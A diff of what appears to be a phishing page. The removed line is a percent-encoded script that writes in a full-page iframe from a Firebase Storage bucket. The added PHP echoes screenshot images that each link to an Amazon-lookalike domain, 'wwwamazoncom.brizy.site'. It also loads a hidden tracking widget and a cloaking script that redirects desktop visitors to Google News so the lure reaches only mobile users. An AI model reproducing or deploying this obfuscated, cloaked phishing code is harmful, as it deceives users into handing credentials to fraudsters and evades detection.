@@ -1,1 +1,33 @@
-<script type='text/javascript'>document.write(unescape('%3C%69%66%72%61%6D%65%20%77%69%64%74%68%3D%22%31%30%30%25%22%20%68%65%69%67%68%74%3D%22%36%30%30%70%78%22%20%73%72%63%3D%22%68%74%74%70%73%3A%2F%2F%66%69%72%65%62%61%73%65%73%74%6F%72%61%67%65%2E%67%6F%6F%67%6C%65%61%70%69%73%2E%63%6F%6D%2F%76%30%2F%62%2F%66%73%38%67%68%37%36%38%66%73%34%37%39%68%38%34%36%2E%61%70%70%73%70%6F%74%2E%63%6F%6D%2F%6F%2F%25%45%46%25%42%43%25%39%46%25%32%30%25%45%46%25%42%43%25%39%46%25%32%30%25%45%46%25%42%43%25%39%46%25%32%30%25%45%46%25%42%43%25%39%46%25%32%30%25%45%46%25%42%43%25%39%46%25%32%30%25%45%46%25%42%43%25%39%46%25%32%30%25%45%46%25%42%43%25%39%46%25%32%46%72%25%44%32%25%38%39%37%25%44%32%25%38%39%38%25%44%32%25%38%39%73%25%44%32%25%38%39%66%25%44%32%25%38%39%34%25%44%32%25%38%39%68%25%44%32%25%38%39%35%25%44%32%25%38%39%36%25%44%32%25%38%39%38%25%44%32%25%38%39%37%25%44%32%25%38%39%66%25%44%32%25%38%39%73%25%44%32%25%38%39%39%25%44%32%25%38%39%38%25%44%32%25%38%39%68%25%44%32%25%38%39%37%25%44%32%25%38%39%38%25%44%32%25%38%39%37%25%44%32%25%38%39%73%25%44%32%25%38%39%39%25%44%32%25%38%39%68%25%44%32%25%38%39%66%25%44%32%25%38%39%38%2E%68%74%6D%6C%3F%61%6C%74%3D%6D%65%64%69%61%26%74%6F%6B%65%6E%3D%63%33%36%38%66%37%37%63%2D%38%63%34%63%2D%34%65%35%62%2D%39%63%38%65%2D%65%34%65%65%36%63%65%39%38%62%37%37%22%20%62%6F%72%64%65%72%3D%22%6E%6F%6E%65%22%20%61%6C%6C%6F%77%3D%22%61%75%74%6F%70%6C%61%79%3B%20%65%6E%63%72%79%70%74%65%64%2D%6D%65%64%69%61%22%20%61%6C%6C%6F%77%66%75%6C%6C%73%63%72%65%65%6E%3E%3C%2F%69%66%72%61%6D%65%3E'))</script>
+<?php
+
+// Genero: ProgramasProgramacion.com
+echo "<meta name=\"deepview-service\" content=\"deepview-service\">\n";
+echo "<link href=\"https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600\" rel=\"stylesheet\" type=\"text/css\">\n";
+echo "\n";
+echo "<p> </p><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://wwwamazoncom.brizy.site/\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" data-original-height=\"345\" data-original-width=\"600\" height=\"368\" src=\"https://1.bp.blogspot.com/--3RpuxXy20o/YRcysgRw-FI/AAAAAAAAAqQ/2VI2qPihkGYYmI812pnyKQwggZeebo6RACLcBGAsYHQ/w640-h368/Screenshot_1.png\" width=\"640\" /></a></div><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://wwwamazoncom.brizy.site/\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" data-original-height=\"340\" data-original-width=\"600\" height=\"362\" src=\"https://1.bp.blogspot.com/-OkI5pdrlEBc/YRcyskaCwBI/AAAAAAAAAqI/z4JjWjf0ZAMiQHeuTsM3i5tYc-ganYd8wCLcBGAsYHQ/w640-h362/Screenshot_2.png\" width=\"640\" /></a></div><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://wwwamazoncom.brizy.site/\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" data-original-height=\"338\" data-original-width=\"600\" height=\"360\" src=\"https://1.bp.blogspot.com/-JTY5tMc8eIY/YRcysvUWSMI/AAAAAAAAAqE/AZqneWBIRR8bzxkYL3Qp6JSYpwpfuUExACLcBGAsYHQ/w640-h360/Screenshot_3.png\" width=\"640\" /></a></div><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://wwwamazoncom.brizy.site/\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" data-original-height=\"339\" data-original-width=\"600\" height=\"362\" src=\"https://1.bp.blogspot.com/-RY4bJlMGPxY/YRcytHAlxdI/AAAAAAAAAqM/Ku9FaF0QzEMSTPXp6vSgTxPkFGe3BhMqACLcBGAsYHQ/w640-h362/Screenshot_4.png\" width=\"640\" /></a></div><br />\n";
+echo "\n";
+echo "\n";
+echo "<div style=\"VISIBILITY: hidden;\"> <script type=\"text/javascript\" src=\"//widgets.amung.us/small.js\"></script><script type=\"text/javascript\">WAU_small('1si0uzxbdr')</script></div>\n";
+echo "\n";
+echo "\n";
+echo "\n";
+echo "<script type=\"text/javascript\">\n";
+echo "//<![CDATA[\n";
+echo " function h(r, a) { var t = \"\"; if (\"mix\" == a) var h = \n";
+echo "\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\"; else var h = \n";
+echo "\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\"; for (var n = 0; r > n; n++) t += h.charAt(Math.floor(Math.random() * \n";
+echo "h.length)); return t };\n";
+echo "\n";
+echo "        var device = navigator.userAgent\n";
+echo "        \n";
+echo "        if (device.match(/Iphone/i)|| device.match(/Ipod/i)|| device.match(/Android/i)|| device.match(/J2ME/i)|| device.match(/BlackBerry/i)|| device.match(/iPhone|iPad|iPod/i)|| device.match(/Opera Mini/i)|| device.match(/IEMobile/i)|| device.match(/Mobile/i)|| device.match(/Windows Phone/i)|| device.match(/windows mobile/i)|| device.match(/windows ce/i)|| device.match(/webOS/i)|| device.match(/palm/i)|| device.match(/bada/i)|| device.match(/series60/i)|| device.match(/nokia/i)|| device.match(/symbian/i)|| device.match(/HTC/i))\n";
+echo "        {\n";
+echo "         \n";
+echo "        }else\n";
+echo "{\n";
+echo " window.location = \"https://news.google.com/topstories?tab=rn&hl=es-419&gl=US&ceid=US:es-419?\"+ h(23, '')+\"/?ref=bookmarks\";\n";
+echo "}\n";
+echo "//]]>\n";
+echo "</script>\n";
+
+?>
